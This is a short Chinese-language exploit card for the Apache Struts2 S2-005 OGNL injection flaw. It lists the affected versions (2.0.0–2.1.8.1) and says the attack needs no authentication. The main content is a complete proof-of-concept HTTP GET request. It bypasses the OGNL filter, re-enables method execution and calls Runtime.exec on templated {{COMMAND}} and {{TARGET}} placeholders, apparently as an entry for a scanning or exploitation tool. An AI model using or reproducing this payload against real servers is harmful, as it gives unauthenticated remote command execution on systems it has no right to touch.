# S2-005 OGNL 注入 RCE

## 指纹特征
- 服务: Apache Struts2 (2.0.0 - 2.1.8.1)
- 协议: HTTP (OGNL 表达式解析)

## 利用矩阵
| 触发方式 | 路径 | 权限要求 |
| :--- | :--- | :--- |
| 参数注入 | `/*.action` | 无 |

## PoC 指令

通过构造包含 `\u0023` 绕过过滤并执行 OGNL 表达式：

```http
GET /example/HelloWorld.action?('\u0023_memberAccess[\'allowStaticMethodAccess\']=true')(vaaa)=true&(aaaa)((%27\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023vccc%27)(%23vccc\u003dnew%20java.lang.Boolean("false")))&(asdf)(('%23rt.exec("{{COMMAND}}")')(%23rt\u003d@java.lang.Runtime@getRuntime()))=1 HTTP/1.1
Host: {{TARGET}}:8080
```

## Success Signal
- **状态验证**: 执行指定命令 (需配合 OGNL 回显手段实现回显)。
